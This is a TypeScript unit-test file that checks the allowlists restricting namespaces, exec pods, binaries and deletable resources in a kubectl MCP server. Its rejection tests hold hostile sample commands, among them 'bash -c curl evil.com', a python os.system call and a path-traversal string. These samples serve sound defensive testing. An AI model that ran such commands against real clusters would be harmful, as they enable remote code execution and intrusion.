/**
 * Unit tests for the kubectl MCP server validation logic.
 *
 * These test the validation functions directly — they don't start the MCP
 * server or call kubectl. The goal is to verify that the allowlists enforce
 * the security boundary correctly.
 */
import { describe, it, expect } from 'vitest';

// Replicate the validation logic and allowlists from kubectl-server.ts.
// If the allowlists change there, update these tests to match.

const ALLOWED_NAMESPACES = [
  'kube-system',
  'arc-systems',
  'buildkit',
  'harbor',
];
const ALLOWED_EXEC_POD_PATTERNS = [/^etcd-/];
const ALLOWED_EXEC_BINARIES = ['etcdctl'];
const ALLOWED_DELETE_RESOURCES = ['pods'];

function validateNamespace(namespace: string): void {
  if (!ALLOWED_NAMESPACES.includes(namespace)) {
    throw new Error(
      `Namespace "${namespace}" not allowed. Allowed: ${ALLOWED_NAMESPACES.join(', ')}`,
    );
  }
}

function validateExecPod(pod: string): void {
  const allowed = ALLOWED_EXEC_POD_PATTERNS.some((p) => p.test(pod));
  if (!allowed) {
    throw new Error(`Pod "${pod}" not allowed for exec.`);
  }
}

function validateExecBinary(command: string[]): void {
  if (command.length === 0) {
    throw new Error('Command array cannot be empty');
  }
  const binary = command[0];
  if (!ALLOWED_EXEC_BINARIES.includes(binary)) {
    throw new Error(`Binary "${binary}" not allowed for exec.`);
  }
}

function validateDeleteResource(resource: string): void {
  if (!ALLOWED_DELETE_RESOURCES.includes(resource)) {
    throw new Error(`Resource "${resource}" not allowed for deletion.`);
  }
}

describe('kubectl MCP server validation', () => {
  describe('validateNamespace', () => {
    it('allows kube-system', () => {
      expect(() => validateNamespace('kube-system')).not.toThrow();
    });

    it('allows arc-systems', () => {
      expect(() => validateNamespace('arc-systems')).not.toThrow();
    });

    it('allows buildkit', () => {
      expect(() => validateNamespace('buildkit')).not.toThrow();
    });

    it('allows harbor', () => {
      expect(() => validateNamespace('harbor')).not.toThrow();
    });

    it('rejects default namespace', () => {
      expect(() => validateNamespace('default')).toThrow('not allowed');
    });

    it('rejects monitoring namespace', () => {
      expect(() => validateNamespace('monitoring')).toThrow('not allowed');
    });

    it('rejects empty string', () => {
      expect(() => validateNamespace('')).toThrow('not allowed');
    });

    it('rejects namespace with path traversal attempt', () => {
      expect(() => validateNamespace('../kube-system')).toThrow('not allowed');
    });
  });

  describe('validateExecPod', () => {
    it('allows etcd-f06cs15', () => {
      expect(() => validateExecPod('etcd-f06cs15')).not.toThrow();
    });

    it('allows etcd-f11-ci-infra-01', () => {
      expect(() => validateExecPod('etcd-f11-ci-infra-01')).not.toThrow();
    });

    it('rejects kube-apiserver pod', () => {
      expect(() => validateExecPod('kube-apiserver-f06cs15')).toThrow(
        'not allowed',
      );
    });

    it('rejects coredns pod', () => {
      expect(() => validateExecPod('coredns-abc123')).toThrow('not allowed');
    });

    it('rejects empty string', () => {
      expect(() => validateExecPod('')).toThrow('not allowed');
    });

    it('rejects pod name that contains etcd but does not start with it', () => {
      expect(() => validateExecPod('my-etcd-pod')).toThrow('not allowed');
    });
  });

  describe('validateExecBinary', () => {
    it('allows etcdctl', () => {
      expect(() =>
        validateExecBinary(['etcdctl', 'endpoint', 'status']),
      ).not.toThrow();
    });

    it('allows etcdctl with TLS args', () => {
      expect(() =>
        validateExecBinary([
          'etcdctl',
          '--cert',
          '/var/lib/rancher/rke2/server/tls/etcd/server-client.crt',
          'defrag',
        ]),
      ).not.toThrow();
    });

    it('rejects bash', () => {
      expect(() =>
        validateExecBinary(['bash', '-c', 'curl evil.com']),
      ).toThrow('not allowed');
    });

    it('rejects sh', () => {
      expect(() => validateExecBinary(['sh', '-c', 'whoami'])).toThrow(
        'not allowed',
      );
    });

    it('rejects curl', () => {
      expect(() =>
        validateExecBinary(['curl', 'http://internal-service']),
      ).toThrow('not allowed');
    });

    it('rejects empty command array', () => {
      expect(() => validateExecBinary([])).toThrow('cannot be empty');
    });

    it('rejects python', () => {
      expect(() =>
        validateExecBinary(['python3', '-c', 'import os; os.system("id")']),
      ).toThrow('not allowed');
    });
  });

  describe('validateDeleteResource', () => {
    it('allows pods', () => {
      expect(() => validateDeleteResource('pods')).not.toThrow();
    });

    it('rejects deployments', () => {
      expect(() => validateDeleteResource('deployments')).toThrow(
        'not allowed',
      );
    });

    it('rejects services', () => {
      expect(() => validateDeleteResource('services')).toThrow('not allowed');
    });

    it('rejects secrets', () => {
      expect(() => validateDeleteResource('secrets')).toThrow('not allowed');
    });

    it('rejects configmaps', () => {
      expect(() => validateDeleteResource('configmaps')).toThrow('not allowed');
    });

    it('rejects namespaces', () => {
      expect(() => validateDeleteResource('namespaces')).toThrow('not allowed');
    });

    it('rejects nodes', () => {
      expect(() => validateDeleteResource('nodes')).toThrow('not allowed');
    });

    it('rejects empty string', () => {
      expect(() => validateDeleteResource('')).toThrow('not allowed');
    });
  });
});
